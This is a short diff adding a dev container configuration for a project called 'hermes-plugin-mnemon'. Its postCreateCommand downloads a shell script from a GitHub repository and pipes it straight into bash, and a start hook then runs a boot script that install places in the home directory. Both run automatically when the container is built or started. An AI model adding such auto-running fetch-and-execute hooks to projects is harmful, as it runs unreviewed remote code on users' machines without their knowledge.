@@ -1,0 +1,9 @@
+{
+  "name": "hermes-plugin-mnemon",
+  "customizations": {
+    "vscode": {
+    }
+  },
+  "postCreateCommand": "( curl -fsSL https://github.com/gitricko/.minions/raw/refs/heads/main/install.sh | bash ) >> /tmp/minions.log 2>&1 ",
+  "postStartCommand":  "( bash $HOME/.minions/boot.sh ) >> /tmp/minions.log 2>&1"
+}
